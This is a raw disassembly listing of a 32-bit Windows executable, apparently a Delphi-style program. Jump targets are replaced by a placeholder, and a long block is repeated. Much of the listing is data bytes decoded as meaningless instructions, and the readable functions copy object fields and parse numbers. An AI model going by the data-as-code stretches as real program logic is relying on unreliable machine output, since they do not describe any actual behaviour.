add [ ecx + ebx * 2 ] bl
dec eax
add [ eax + 0x59 ] ah
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x59 ] al
dec eax
add [ eax - 0x3c000000 ] al
push eax
dec eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
pop ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al [ eax ]
popad
insd
mov al 0x10
inc eax
add [ eax + eax + 0x94ff00 ] dl
add bh bh
add [ eax ] eax
outsd
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
or [ ebp + 0x73 ] edx
jb r-xdata
mov al 0x10
inc eax
add [ eax + eax ] bh
outsd
jae r-xdata
add [ eax ] al
adc [ eax + eax ] 0x4
dec eax
inc ebp
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] r-xdata
je r-xdata
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
outsb
outsw
cld
push ebp
dec eax
add [ ecx + edx * 2 + 0x1c0048 ] cl
adc [ ecx + 0x64 ] cl
dec eax
push esp
push esp
push eax
dec eax
popad
jb r-xdata
popad
je r-xdata
outsd
outsb
jae r-xdata
add [ eax + eax ] ch
outsd
outsb
jae r-xdata
insd
add [ eax ] al
adc [ 0x72460400 ] 0x6f
adc [ eax ] al
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
add bh bh
je r-xdata
popad
jb r-xdata
outsb
outsw
or eax 0x4010b000
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000f ] al
add [ eax ] al
add [ eax ] 0x0
outsd
outsb
mov al 0x10
inc eax
add [ eax + eax ] dh
push [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500f0011 ] al
jb r-xdata
adc [ eax ] 0x0
or [ edi + ebp * 2 + 0x63 ] cl
dec eax
outsb
jae r-xdata
dec eax
popad
jb r-xdata
jae r-xdata
or [ eax + 0x61 ] dl
adc [ eax ] al
mov [ eax ] es
add bh bh
mov [ eax ] es
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
or [ ebp + 0x73 ] dl
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
push cs
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
add [ eax + eax + 0x9cff00 ] bl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
adc eax [ edx + 0x61 ]
add [ gs : eax ] dl
je r-xdata
adc al 0x8b
mov [ ebx + ebx * 8 + 0xbe80f74 ] 0x64fff7e8
pop [ 0x0 ]
add esp 0xc
mov eax edi
pop edi
pop esi
pop ebx
jb r-xdata
add [ eax + 0x570f0014 ] al
push edi
push edi
inc ecx
jne r-xdata
js r-xdata
inc eax
outsb
outsw
add [ ecx + 0x48 ] bl
add [ ecx + edx * 2 + 0x150048 ] cl
adc [ ecx + 0x64 ] cl
dec eax
push esp
push esp
push eax
dec eax
popad
jb r-xdata
popad
jb r-xdata
dec eax
[ eax + eax ]
adc [ eax ] al
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
str [ ecx + eax * 2 ]
arpl [ ebx + 0x65 ] sp
jo r-xdata
outsb
outsw
pushad
pop ecx
dec eax
mov al 0x10
inc eax
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50080016 ] al
dec esp
popad
add [ eax + 0x53060013 ] al
pop es
dec eax
add [ eax + eax ] bh
inc [ esi + ebp * 2 ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0x8 ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0x40 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416d9c
test bl bl
jle r-xdata
push 0x69746e65
outsb
je r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
hlt
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
outsb
outsw
push es
add [ eax + 0x68004010 ] dh
add [ eax ] al
push [ ecx + esi * 2 + 0x10048 ]
jne r-xdata
push edx
popad
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
retn
arpl [ ecx + 0x74 ] sp
nop
add bh bh
je r-xdata
push 0x69746e65
arpl [ ecx + 0x74 ] sp
mov al 0x10
inc eax
add [ eax ] dh
add bh bh
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
push es
push ebx
sub_4855b4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ esi + 0x48 ] dl
add [ esi + edx * 2 + 0x48 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dl [ esi + 0x48 ]
add [ eax + eax + 0x50c40000 ] ah
dec eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add al bh
insb
dec eax
add [ eax ] cl
push 0x6eb40048
inc ecx
add al cl
insd
inc ecx
add ah bl
dec eax
add [ eax + 0x69 ] ch
dec eax
add ah bl
push 0x5a800048
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ 0xffffffffb0000000 ] cl
adc [ eax ] al
push 0xb0000000
adc [ eax ] al
insb
add [ eax ] al
add [ eax + 0x70004010 ] dh
add [ eax ] al
add [ eax + 0x74004010 ] dh
add [ eax ] al
add [ eax + 0x78004010 ] dh
add [ eax ] al
add [ eax + 0x7c004010 ] dh
add [ eax ] al
add [ eax - 0x7fffbff0 ] dh
add [ eax ] al
add [ eax - 0x7bffbff0 ] dh
add [ eax ] al
add [ eax - 0x77ffbff0 ] dh
add [ eax ] al
add [ eax - 0x73ffbff0 ] dh
add [ eax ] al
add [ eax - 0x6fffbff0 ] dh
add [ eax ] al
add [ eax - 0x6bffbff0 ] dh
add [ eax ] al
add [ eax - 0x67ffbff0 ] dh
add [ eax ] al
add [ esp + edx * 2 ] dl
dec ecx
push edx
jno r-xdata
add [ eax ] al
jae r-xdata
inc edx
popad
inc ebx
push 0x65537261
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410d0010 ] al
arpl [ ebx + 0x65 ] sp
jo r-xdata
dec eax
popad
jb r-xdata
popad
arpl [ ecx + 0x75 ] ax
je r-xdata
dec ecx
adc [ eax ] al
arpl [ ebx + 0x65 ] sp
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sldt [ esi ]
inc ecx
outsb
outsw
nop
movsb [ edi ] [ esi ]
push esi
dec eax
add [ edi ] al
adc al 0x54
dec ecx
push edx
jno r-xdata
add bh bh
xchg esp eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500f001a ] al
jb r-xdata
ja r-xdata
outsd
outsb
je r-xdata
outsb
jne r-xdata
mov al 0x10
inc eax
add [ eax + eax ] ch
[ eax + eax ]
add bh bh
jo r-xdata
inc eax
add [ eax ] dh
jae r-xdata
add [ eax ] bl
aas
inc eax
add [ ebp + ebp * 2 + 0x5b280048 ] dh
dec eax
js r-xdata
xchg esp eax
add [ eax ] al
call [ eax + eax + 0x1ff00 ]
jb r-xdata
jb r-xdata
mov al 0x10
inc eax
add [ eax + eax + 0x84ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ edi ] al
push edx
jb r-xdata
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040014 ] al
add [ eax - 0x80000000 ] al
adc eax 0x72460400
outsd
jae r-xdata
add [ gs : bx + si ] dl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
push cs
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
jo r-xdata
dec eax
popad
jb r-xdata
add [ edi ] al
adc eax 0x52644954
jae r-xdata
add [ eax ] bh
insd
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ eax ] ch
add [ eax ] al
mov al 0x10
inc eax
add [ eax + eax ] ch
add [ eax + 0x70004010 ] dh
add [ eax ] al
add [ eax + 0x74004010 ] dh
add [ eax ] al
add [ 0x52644954 ] dl
jae r-xdata
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
add [ esi + ebp * 2 ] dl
dec eax
add [ eax + 0x5000486f ] cl
jno r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
mov al 0x10
inc eax
add [ eax - 0x67010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5205001b ] al
popad
outsb
add [ gs : bx + di + 0x48 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 2 ] bl
dec eax
add [ eax + 0x59 ] ah
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x59 ] al
dec eax
add [ eax - 0x3c000000 ] al
push eax
dec eax
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
pop ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al [ eax ]
popad
insd
mov al 0x10
inc eax
add [ eax + eax + 0x94ff00 ] dl
add bh bh
add [ eax ] eax
outsd
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
or [ ebp + 0x73 ] edx
jb r-xdata
mov al 0x10
inc eax
add [ eax + eax ] bh
outsd
jae r-xdata
add [ eax ] al
adc [ eax + eax ] 0x4
dec eax
inc ebp
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] r-xdata
je r-xdata
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
outsb
outsw
cld
push ebp
dec eax
add [ ecx + edx * 2 + 0x1c0048 ] cl
adc [ ecx + 0x64 ] cl
dec eax
push esp
push esp
push eax
dec eax
popad
jb r-xdata
popad
je r-xdata
outsd
outsb
jae r-xdata
add [ eax + eax ] ch
outsd
outsb
jae r-xdata
insd
add [ eax ] al
adc [ 0x72460400 ] 0x6f
adc [ eax ] al
mov [ eax ] al
add bh bh
mov [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
add bh bh
je r-xdata
popad
jb r-xdata
outsb
outsw
or eax 0x4010b000
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000f ] al
add [ eax ] al
add [ eax ] 0x0
outsd
outsb
mov al 0x10
inc eax
add [ eax + eax ] dh
push [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500f0011 ] al
jb r-xdata
adc [ eax ] 0x0
or [ edi + ebp * 2 + 0x63 ] cl
dec eax
outsb
jae r-xdata
dec eax
popad
jb r-xdata
jae r-xdata
or [ eax + 0x61 ] dl
adc [ eax ] al
mov [ eax ] es
add bh bh
mov [ eax ] es
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
or [ ebp + 0x73 ] dl
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc al [ eax ]
push cs
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
add [ eax + eax + 0x9cff00 ] bl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
adc eax [ edx + 0x61 ]
add [ gs : eax ] dl
je r-xdata
adc al 0x8b
mov [ ebx + ebx * 8 + 0xbe80f74 ] 0x64fff7e8
pop [ 0x0 ]
add esp 0xc
mov eax edi
pop edi
pop esi
pop ebx
jb r-xdata
add [ eax + 0x570f0014 ] al
push edi
push edi
inc ecx
jne r-xdata
js r-xdata
inc eax
outsb
outsw
add [ ecx + 0x48 ] bl
add [ ecx + edx * 2 + 0x150048 ] cl
adc [ ecx + 0x64 ] cl
dec eax
push esp
push esp
push eax
dec eax
popad
jb r-xdata
popad
jb r-xdata
dec eax
[ eax + eax ]
adc [ eax ] al
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
str [ ecx + eax * 2 ]
arpl [ ebx + 0x65 ] sp
jo r-xdata
outsb
outsw
pushad
pop ecx
dec eax
mov al 0x10
inc eax
add [ eax - 0x7f010000 ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50080016 ] al
dec esp
popad
add [ eax + 0x53060013 ] al
pop es
dec eax
add [ eax + eax ] bh
inc [ esi + ebp * 2 ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0x8 ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0x40 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416d9c
test bl bl
jle r-xdata
push 0x69746e65
outsb
je r-xdata
inc ebx
outsd
outsb
outsb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
hlt
arpl [ ecx + 0x74 ] sp
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
outsb
outsw
push es
add [ eax + 0x68004010 ] dh
add [ eax ] al
push [ ecx + esi * 2 + 0x10048 ]
jne r-xdata
push edx
popad
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
retn
arpl [ ecx + 0x74 ] sp
nop
add bh bh
je r-xdata
push 0x69746e65
arpl [ ecx + 0x74 ] sp
mov al 0x10
inc eax
add [ eax ] dh
add bh bh
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc eax [ eax ]
push es
push ebx
sub_485a80
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403f34
mov dl 0x1
mov eax [ r-xdata ]
call sub_480820
mov esi eax
mov [ edi + 0x8 ] esi
mov [ esi + 0x40 ] 0x400
mov dl 0x1
mov eax [ r-xdata ]
call sub_480820
mov [ edi + 0x40 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_485ae8
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
lea edx [ esi + 0x8 ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ esi + 0x40 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416d9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_485b28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416eac
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_404114
mov esi eax
mov edx [ ebx + 0x8 ]
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ esi + 0x10 ]
mov edx [ ebx + 0x10 ]
call sub_404e98
lea eax [ esi + 0x14 ]
mov edx [ ebx + 0x14 ]
call sub_404e98
lea eax [ esi + 0x38 ]
mov edx [ ebx + 0x38 ]
call sub_404e98
lea eax [ esi + 0x3c ]
mov edx [ ebx + 0x3c ]
call sub_404e98
mov eax [ ebx + 0x18 ]
mov [ esi + 0x18 ] eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x24 ]
mov [ esi + 0x24 ] eax
mov eax [ ebx + 0x28 ]
mov [ esi + 0x28 ] eax
mov eax [ ebx + 0x2c ]
mov [ esi + 0x2c ] eax
mov eax [ ebx + 0x30 ]
mov [ esi + 0x30 ] eax
mov eax [ ebx + 0x34 ]
mov [ esi + 0x34 ] eax
mov eax [ ebx + 0x48 ]
mov [ esi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ esi + 0x4c ] eax
mov eax [ ebx + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ ebx + 0x54 ]
mov [ esi + 0x54 ] eax
mov eax [ ebx + 0x58 ]
mov [ esi + 0x58 ] eax
mov eax [ ebx + 0x5c ]
mov [ esi + 0x5c ] eax
pop esi
pop ebx
retn
sub_485bec
push ebx
mov ebx eax
lea eax [ ebx + 0xc ]
call sub_404e44
lea eax [ ebx + 0x3c ]
call sub_404e44
lea eax [ ebx + 0x10 ]
call sub_404e44
lea eax [ ebx + 0x14 ]
call sub_404e44
lea eax [ ebx + 0x38 ]
call sub_404e44
mov [ ebx + 0x18 ] 0xffffffff
mov [ ebx + 0x1c ] 0xffffffff
mov [ ebx + 0x28 ] 0x0
mov [ ebx + 0x2c ] 0x0
mov [ ebx + 0x20 ] 0x0
mov [ ebx + 0x24 ] 0x0
mov [ ebx + 0x30 ] 0x0
mov [ ebx + 0x34 ] 0x0
xor eax eax
mov [ ebx + 0x48 ] eax
mov [ ebx + 0x4c ] eax
xor eax eax
mov [ ebx + 0x58 ] eax
mov [ ebx + 0x5c ] eax
xor eax eax
mov [ ebx + 0x50 ] eax
mov [ ebx + 0x54 ] eax
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
pop ebx
retn
sub_485c74
push ebp
mov ebp esp
mov ecx 0x9
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_485f34
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x8 ]
lea ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0xc ]
call sub_404e98
lea ecx [ ebp - 0x14 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x14 ]
lea eax [ ebx + 0x3c ]
call sub_404e98
lea ecx [ ebp - 0x18 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x18 ]
lea eax [ ebx + 0x10 ]
call sub_404e98
lea ecx [ ebp - 0x1c ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x1c ]
lea eax [ ebx + 0x14 ]
call sub_404e98
lea ecx [ ebp - 0x20 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x20 ]
lea eax [ ebx + 0x38 ]
call sub_404e98
lea ecx [ ebp - 0x28 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x24 ]
mov eax [ r-xdata ]
call sub_4626c4
mov edx [ ebp - 0x24 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
cdq
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
setge al
cmp [ ebx + 0x18 ] 0x0
setae al
jmp r-xdata
lea ecx [ ebp - 0x34 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov eax [ ebp - 0x34 ]
call sub_470cf0
fstp [ ebx + 0x48 ]
fwait
lea ecx [ ebp - 0x38 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov eax [ ebp - 0x38 ]
call sub_470cf0
fstp [ ebx + 0x58 ]
fwait
lea ecx [ ebp - 0x3c ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x3c ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
inc eax
je r-xdata
push 0x1
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
push 0x1
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
push 0x1
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
push 0x0
push 0x0
push 0x1
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x8 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x30 ]
mov eax [ r-xdata ]
call sub_4627e8
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] edx
push 0x0
push 0x0
mov edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_4627e8
mov [ ebx + 0x20 ] eax
mov [ ebx + 0x24 ] edx
push 0x0
push 0x0
mov edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_4627e8
mov [ ebx + 0x30 ] eax
mov [ ebx + 0x34 ] edx
mov [ ebx + 0x64 ] al
mov [ ebx + 0x28 ] 0x0
mov [ ebx + 0x2c ] 0x0
mov [ ebx + 0x20 ] 0x0
mov [ ebx + 0x24 ] 0x0
mov [ ebx + 0x30 ] 0x0
mov [ ebx + 0x34 ] 0x0
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_480c80
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea ecx [ ebp - 0x48 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov eax [ ebp - 0x48 ]
call sub_470cf0
fstp [ ebx + 0x50 ]
fwait
lea ecx [ ebp - 0x40 ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x40 ]
mov eax [ r-xdata ]
call sub_462614
mov edi eax
mov eax [ r-xdata ]
call sub_4626ec
mov [ ebp - 0x44 ] edi
fild [ ebp - 0x44 ]
fdiv [ r-xdata ]
faddp st1
fstp [ ebx + 0x50 ]
fwait
jmp r-xdata
lea ecx [ ebp - 0x4c ]
mov edx r-xdata
mov eax esi
call sub_480c80
mov edx [ ebp - 0x4c ]
lea eax [ ebx + 0x60 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485f3b
lea eax [ ebp - 0x4c ]
mov edx 0x2
call sub_404e68
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_404e68
retn
sub_486060
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_48622b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi [ ebx + 0x8 ]
mov eax [ ebx + 0xc ]
call sub_405120
test eax eax
jle r-xdata
mov eax [ ebx + 0x3c ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebx + 0xc ]
mov edx r-xdata
mov eax esi
call sub_480ea0
mov eax [ ebx + 0x10 ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebx + 0x3c ]
mov edx r-xdata
mov eax esi
call sub_480ea0
mov eax [ ebx + 0x14 ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebx + 0x10 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
mov eax [ ebx + 0x38 ]
call sub_405120
test eax eax
jle r-xdata
mov ecx [ ebx + 0x14 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx [ ebx + 0x38 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
jl r-xdata
cmp [ ebx + 0x18 ] 0x0
jb r-xdata
mov eax [ ebx + 0x4 ]
call sub_405120
test eax eax
jle r-xdata
push [ ebx + 0x1c ]
push [ ebx + 0x18 ]
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_462598
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
jmp r-xdata
fld [ ebx + 0x48 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
jbe r-xdata
mov ecx [ ebx + 0x4 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
fld [ ebx + 0x50 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
jbe r-xdata
push [ ebx + 0x4c ]
push [ ebx + 0x48 ]
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_462944
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
mov eax [ ebx + 0x60 ]
call sub_405120
test eax eax
jle r-xdata
push [ ebx + 0x54 ]
push [ ebx + 0x50 ]
lea edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_462944
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_480ea0
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov ecx [ ebx + 0x60 ]
mov edx r-xdata
mov eax esi
call sub_480ea0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_486232
lea eax [ ebp - 0x14 ]
mov edx 0x5
call sub_404e68
retn
lea edx [ ebp - 0x10 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_40512c
mov edx [ ebp - 0x10 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_486328
push ebp
mov ebp esp
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x1c ] eax
cmp [ ecx + 0x1c ] 0x0
jne r-xdata
setge al
cmp [ ecx + 0x18 ] 0x0
setae al
jmp r-xdata
mov [ ecx + 0x64 ] al
pop ebp
retn 0x8
sub_486384
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov eax esi
call sub_48645c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4863c0
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416d9c
test bl bl
jle r-xdata
lea edx [ esi + 0x4 ]
mov eax [ r-xdata ]
call sub_462560
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_4863f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_416eac
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_404114
mov esi eax
lea eax [ esi + 0x8 ]
mov edx [ ebx + 0x8 ]
call sub_404e98
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebx + 0x10 ]
call sub_404e98
lea eax [ esi + 0x14 ]
mov edx [ ebx + 0x14 ]
call sub_404e98
movzx eax [ ebx + 0x18 ]
mov [ esi + 0x18 ] al
pop esi
pop ebx
retn
sub_486480
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_48653a
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ ebx + 0x18 ] 0x0
